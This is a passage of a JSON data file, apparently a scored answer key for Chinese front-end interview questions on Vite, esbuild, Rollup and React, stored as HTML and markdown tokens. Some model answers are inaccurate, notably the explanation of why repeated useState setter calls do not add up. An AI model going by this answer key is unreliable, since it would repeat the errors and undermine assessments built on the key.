利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。","tokens":[{"type":"text","raw":"**1：** Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。","text":"**1：** Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。","text":" Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## esbuild 和 rollup 都是 vite 的基础依赖， 那么他们有啥不同？\\n\\n","depth":2,"text":"esbuild 和 rollup 都是 vite 的基础依赖， 那么他们有啥不同？","tokens":[{"type":"text","raw":"esbuild 和 rollup 都是 vite 的基础依赖， 那么他们有啥不同？","text":"esbuild 和 rollup 都是 vite 的基础依赖， 那么他们有啥不同？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。\\n\\n- **1：** Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。\\n\\n- **1：** 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。\\n\\n","task":false,"loose":true,"text":"**1：** esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。\\n","tokens":[{"type":"text","raw":"**1：** esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。\\n","text":"**1：** esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。","text":" esbuild：esbuild 是一个快速、可扩展的 JavaScript 打包器，它被用作 Vite 的默认构建工具。esbuild 的主要任务是将源代码转换为浏览器可以理解的代码，同时还支持压缩、代码分割、按需加载等功能。esbuild 利用其高性能的构建能力，实现了快速的开发服务器和热模块替换。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。\\n\\n","task":false,"loose":true,"text":"**1：** Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。\\n","tokens":[{"type":"text","raw":"**1：** Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。\\n","text":"**1：** Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。","text":" Rollup：Rollup 是一个 JavaScript 模块打包工具，也是 Vite 的另一个基础依赖。在 Vite 中，Rollup 主要用于生产构建阶段。它通过静态分析模块依赖关系，将多个模块打包为一个或多个最终的输出文件。Rollup 支持多种输出格式，如 ES 模块、CommonJS、UMD 等，可以根据项目的需要进行配置。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。","task":false,"loose":true,"text":"**1：** 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。","tokens":[{"type":"text","raw":"**1：** 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。","text":"**1：** 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。","text":" 尽管 esbuild 和 Rollup 都是 Vite 的基础依赖，但它们的分工是不同的。esbuild 用于开发服务器阶段，通过实时编译和提供模块来实现快速的冷启动和热模块替换。而 Rollup 用于生产构建阶段，将源代码打包为最终可发布的文件，以用于部署到生产环境。这样的分工使得 Vite 在开发过程中能够快速响应变化，并在构建过程中生成高效的最终输出文件。","escaped":false}]}]}]}]},{"key":"Rollup","content":"<h1>Rollup</h1>\\n<h2>什么是 Rollup？它与 Webpack 有何不同？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><p><strong>6：</strong> Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。</p>\\n</li>\\n<li><p>模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。</p>\\n</li>\\n<li><p>性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。</p>\\n</li>\\n<li><p>输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。</p>\\n</li>\\n<li><p>插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。</p>\\n</li>\\n<li><p>在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化</p>\\n</li>\\n<li><p>Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。</p>\\n</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# Rollup\\n\\n","depth":1,"text":"Rollup","tokens":[{"type":"text","raw":"Rollup","text":"Rollup","escaped":false}]},{"type":"heading","raw":"## 什么是 Rollup？它与 Webpack 有何不同？\\n\\n","depth":2,"text":"什么是 Rollup？它与 Webpack 有何不同？","tokens":[{"type":"text","raw":"什么是 Rollup？它与 Webpack 有何不同？","text":"什么是 Rollup？它与 Webpack 有何不同？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **6：** Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。\\n\\n- 模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。\\n- 性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。\\n- 输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。\\n- 插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。\\n- 在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化\\n- Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **6：** Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。\\n\\n","task":false,"loose":true,"text":"**6：** Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。\\n","tokens":[{"type":"text","raw":"**6：** Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。\\n","text":"**6：** Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。","tokens":[{"type":"strong","raw":"**6：**","text":"6：","tokens":[{"type":"text","raw":"6：","text":"6：","escaped":false}]},{"type":"text","raw":" Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。","text":" Rollup 是一个 JavaScript 模块打包器，主要用于将多个模块捆绑成一个或多个文件。与 Webpack 相比，Rollup 主要优化了代码的静态分析和树摇（Tree Shaking），它特别适用于构建 JavaScript 库和模块。","escaped":false}]}]},{"type":"list_item","raw":"- 模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。\\n","task":false,"loose":true,"text":"模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。","tokens":[{"type":"text","raw":"模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。","text":"模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。","tokens":[{"type":"text","raw":"模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。","text":"模块系统支持：Rollup 专注于 ES6 模块（ESM），而 Webpack 则支持多种模块系统（CommonJS、AMD、ESM 等）。","escaped":false}]}]},{"type":"list_item","raw":"- 性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。\\n","task":false,"loose":true,"text":"性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。","tokens":[{"type":"text","raw":"性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。","text":"性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。","tokens":[{"type":"text","raw":"性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。","text":"性能：Rollup 对于构建库的性能比 Webpack 更好，因为它优化了打包过程，特别是树摇（Tree Shaking）。","escaped":false}]}]},{"type":"list_item","raw":"- 输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。\\n","task":false,"loose":true,"text":"输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。","tokens":[{"type":"text","raw":"输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。","text":"输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。","tokens":[{"type":"text","raw":"输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。","text":"输出格式：Rollup 支持多种输出格式（如 ES、CommonJS、UMD、IIFE 等），而 Webpack 更加侧重于打包应用程序。","escaped":false}]}]},{"type":"list_item","raw":"- 插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。\\n","task":false,"loose":true,"text":"插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。","tokens":[{"type":"text","raw":"插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。","text":"插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。","tokens":[{"type":"text","raw":"插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。","text":"插件系统：Rollup 的插件系统比 Webpack 更简洁，WebPack 插件系统更强大，适合复杂的应用场景。","escaped":false}]}]},{"type":"list_item","raw":"- 在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化\\n","task":false,"loose":true,"text":"在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化","tokens":[{"type":"text","raw":"在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化","text":"在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化","tokens":[{"type":"text","raw":"在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化","text":"在 Rollup 中，树摇是默认启用的，只要你使用了 ES 模块的语法，并且在构建时选择生产模式（如设置 minify 或 treeshake），就能自动进行树摇优化","escaped":false}]}]},{"type":"list_item","raw":"- Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。","task":false,"loose":true,"text":"Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。","tokens":[{"type":"text","raw":"Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。","text":"Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。","tokens":[{"type":"text","raw":"Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。","text":"Rollup 的插件系统非常强大，可以通过 plugins 配置项来引入各种插件。插件可以用来处理各种功能，如转换文件格式、代码压缩、代码分割、环境变量注入等。","escaped":false}]}]}]}]},{"key":"react","content":"<h1>react</h1>\\n<h2>什么是 React 的生命周期方法？</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：W1</h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 类组件声明周期方法:</li>\\n<li><strong>1：</strong> 挂载阶段：constructor(): 在组件创建时调用，通常用来初始化状态; componentDidMount(): 在组件挂载到 DOM 后调用，一般用来执行异步请求或订阅事件。</li>\\n<li><strong>1：</strong> 更新阶段：shouldComponentUpdate(): 用来优化性能，判断组件是否需要重新渲染； componentDidUpdate(): 在组件更新后调用，通常用于来操作DOM。</li>\\n<li><strong>1：</strong> 卸载阶段：componentWillUnmount(): 在组件从 DOM 中卸载之前调用，一般用来清理资源。</li>\\n<li><strong>1：</strong> 函数组件生命周期（Hooks）:</li>\\n<li><strong>1：</strong> useEffect(): 用来替代 componentDidMount、componentDidUpdate 和 componentWillUnmount，可以设置副作用和清理操作。</li>\\n</ul>\\n<pre><code class=\\"language-js\\">\\nuseEffect(() =&gt; {\\n// 组件挂载时执行的操作\\nreturn () =&gt; {\\n// 组件卸载时清理资源\\n};\\n}, [dependencies]);  // 依赖数组\\n</code></pre>\\n<h2>React 中的 Hook 是什么？</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：W1</h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong> useState()：用于在函数组件中添加状态。</li>\\n<li><strong>1：</strong> useEffect()：用于在函数组件中执行副作用操作（如数据请求、订阅、DOM 操作等）。</li>\\n<li><strong>1：</strong> useContext()：用于在函数组件中访问上下文（Context）。</li>\\n<li><strong>1：</strong> useReducer()：类似于 useState，但适用于复杂的状态管理，类似于 Redux 的 reducer。</li>\\n<li><strong>1：</strong> useRef()：用于访问组件中的 DOM 节点或保存可变的值。</li>\\n<li><strong>1：</strong> useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。</li>\\n</ul>\\n<h2>React 中的状态和 props 有什么区别？</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：W2</h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。</li>\\n</ul>\\n<pre><code class=\\"language-js\\"> function MyComponent(props) {\\n  return &lt;h1&gt;{props.message}&lt;/h1&gt;;\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function MyComponent() {\\n  const [count, setCount] = useState(0);\\n  return &lt;button onClick={() =&gt; setCount(count + 1)}&gt;{count}&lt;/button&gt;;\\n}\\n</code></pre>\\n<h2>React 中如何处理事件？</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：W2</h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function MyComponent() {\\n  const handleClick = (event) =&gt; {\\n    alert(&#39;Button clicked!&#39;);\\n  };\\n\\n  return &lt;button onClick={handleClick}&gt;Click Me&lt;/button&gt;;\\n}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> React 会自动绑定事件处理函数。</li>\\n<li><strong>1：</strong> 事件对象会被 React 规范化。</li>\\n</ul>\\n<h2>useState 连续调用，页面不更新？</h2>\\n<h4>类型：基础</h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<pre><code class=\\"language-js\\">const [age,  setAge] = useState(42);\\n\\nfunction handleClick() {\\n  setAge(age + 1); // setAge(42 + 1)\\n  setAge(age + 1); // setAge(42 + 1)\\n  setAge(age + 1); // setAge(42 + 1)\\n}\\n\\n// 点击一次后，age 将只会变为 43 而不是 45！\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。</li>\\n<li><strong>1：</strong> 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function handleClick() {\\n  setAge(a =&gt; a + 1); // setAge(42 =&gt; 43)\\n  setAge(a =&gt; a + 1); // setAge(43 =&gt; 44)\\n  setAge(a =&gt; a + 1); // setAge(44 =&gt; 45)\\n}\\n</code></pre>\\n<h2>React中的性能优化方法有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 使用React.memo进行组件缓存：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">const MyComponent = React.memo(function MyComponent(props) {\\n  /* 组件逻辑 */\\n});\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 使用useMemo缓存计算结果：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">const memoizedValue = useMemo(() =&gt; computeExpensiveValue(a, b), [a, b]);\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 使用useCallback缓存函数：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">const memoizedCallback = useCallback(\\n  () =&gt; {\\n    doSomething(a, b);\\n  },\\n  [a, b],\\n);\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 合理使用key：</li>\\n</ul>\\n<pre><code class=\\"language-jsx\\">{list.map(item =&gt; (\\n  &lt;ListItem \\n    key={item.id} // 使用唯一且稳定的key\\n    data={item}\\n  /&gt;\\n))}\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 避免不必要的渲染：<ul>\\n<li>使用React.lazy进行代码分割</li>\\n<li>使用虚拟列表处理长列表</li>\\n<li>合理设计组件层级</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>什么是 React？它的主要特点是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：</p>\\n</li>\\n<li><p>组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。</p>\\n</li>\\n<li><p>虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。</p>\\n</li>\\n<li><p>声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。</p>\\n</li>\\n<li><p>JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。</p>\\n</li>\\n<li><p>生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。</p>\\n</li>\\n</ul>\\n<h2>什么是 JSX？它有什么优点？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.</p>\\n</li>\\n<li><p>可读性强：JSX 